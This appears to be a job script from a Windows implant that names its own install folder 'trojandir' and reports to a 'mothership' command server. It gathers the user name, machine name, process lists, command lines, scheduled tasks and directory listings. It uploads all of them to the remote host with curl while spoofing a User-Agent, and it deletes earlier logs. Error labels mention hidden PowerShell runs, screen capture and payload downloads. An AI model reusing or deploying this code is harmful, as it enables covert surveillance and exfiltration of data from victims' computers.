REM both are set by retrieve.php / mothership
REM SET jobcode=
REM SET mothership=

SETLOCAL ENABLEDELAYEDEXPANSION

set /a error_code=0

set script_version=tpl_cmd_list

set batchid=%jobcode%
set sessionid=%jobcode%

IF "%jobcode%"=="" (
    set sessionid=99%random%%random%%random%%random%%random%
    set sessionid=%sessionid:~0,8%
    set batchid=%sessionid%
    set jobcode=%sessionid%
)

SET "trojandir=C:\ProgramData\owd"

set clientid=xxxxxxxx

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET "timestamp=%tt:~0,14%%tt:~15,4%"

cd /d %trojandir%
        
set workdir=%trojandir%\cmdlist_%timestamp%

md %workdir%

cd /d %workdir%
    
set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"


echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%"
set params=%params% --data-urlencode "username=%tusername%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"
set params=%params% --data-urlencode "script_version=%script_version%"

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_started" %params%

REM ---

set msg=setup done
echo %msg% >> %logfpath%
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%


REM --- cleanup

copy /y %trojandir%\*.log %workdir%

for /d %%G in ( %trojandir%\cmdlist_* ) do ( 
    if NOT "%%G"=="%workdir%" (
        rmdir /S /Q %%G 
    )
)
del /f /q %trojandir%\*.log
del /f /q %trojandir%\cmds_log_*.txt

REM master_*.log
REM cmd_list_job_file_*

cd /d %trojandir%

REM --- init snapshot 

schtasks /v /fo:csv > %workdir%\schtasks_snapshot_init.txt
dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_init.txt
wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_init.txt
tasklist /v /fo csv > %workdir%\task_snapshot_init.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_init.csv"

REM --- setup python env

set pythondir=
IF EXIST %trojandir%\python_path (
	
	for /f "tokens=1 delims=|" %%i in (%trojandir%\python_path) do ( 
		set "pythondir=%%i"
	)
)

IF "%pythondir%"=="" (
    set pythondir=%trojandir%\python\work\Portable Python-3.10.5 x64\App\Python
)

IF NOT EXIST "%pythondir%" (
	goto :error_pythondir_not_exist
)

SET "pythonexe=%trojandir%\python\work\Portable Python-3.10.5 x64\App\Python\python.exe"

REM --- test python

"%pythonexe%" --version > %workdir%\python_version

REM --- install modules

"%pythonexe%" -m pip install --upgrade pip > %workdir%\python_pip_upgrade.log 2>&1
"%pythonexe%" -m pip install psutil > %workdir%\python_pip_psutil.log 2>&1
"%pythonexe%" -m pip install websocket-client > %workdir%\python_pip_websocket-client.log 2>&1

REM will print "Requirement already satisfied" if module is installed

REM --- final snapshot
:finalsnapshot

schtasks /v /fo:csv > %workdir%\schtasks_snapshot_final.txt
dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_final.txt
wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_final.txt
tasklist /v /fo csv > %workdir%\task_snapshot_final.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_final.csv"


REM --- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

cd /d %workdir%

FOR %%F IN ("*") DO (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

	curl -v -ks -T "%%F" -X PUT %mothershipassets%/clients/clientid_%clientid%/jobcode_%jobcode%/%%F -H "Content-Type: application/octet-stream" %bunnyheader% -H "User-Agent: python-requests/2.32.3"
)


REM ---

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

set /a error_code=0

:error_pythondir_not_exist
set /a error_code+=1
:error_failed_gsd_download
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1
:error_general
set /a error_code+=1

set filename=%source%_cmds.log
set filepath=%trojandir%\%filename%

IF EXIST %filepath% (
	copy /y %filepath% %workdir%
	
	curl -v -ks -T "%filepath%" -X PUT %mothershipassets%/clients/clientid_%clientid%/jobcode_%jobcode%/%filename% -H "Content-Type: application/octet-stream" %bunnyheader% -H "User-Agent: python-requests/2.32.3"
)


set msg=errors occurred while executing error_code %error_code%
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
